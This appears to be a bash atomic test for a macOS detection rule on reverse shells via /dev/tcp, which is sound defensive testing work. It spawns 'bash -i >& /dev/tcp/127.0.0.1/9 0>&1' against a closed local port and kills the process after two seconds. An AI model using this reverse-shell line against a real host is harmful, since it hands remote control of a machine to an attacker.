#!/usr/bin/env bash
# Atomic test — rule be06a6b0-fa9f-4df4-9d4a-9f8794037508
#   "macOS Reverse Shell via /dev/tcp"  (process_creation)
#
# Spawns a shell whose command line carries the /dev/tcp pseudo-device plus a
# stream redirect — the exact tokens the rule keys on. It points at a closed
# local port so nothing connects (and Apple's stock bash lacks /dev/tcp, so it
# errors instantly anyway). The detection fires on the process_creation argv,
# not on the network. A background guard kills it after a couple of seconds.
set -u
bash -c 'bash -i >& /dev/tcp/127.0.0.1/9 0>&1' >/dev/null 2>&1 &
pid=$!
sleep 2
kill "$pid" 2>/dev/null || true
wait "$pid" 2>/dev/null || true
exit 0
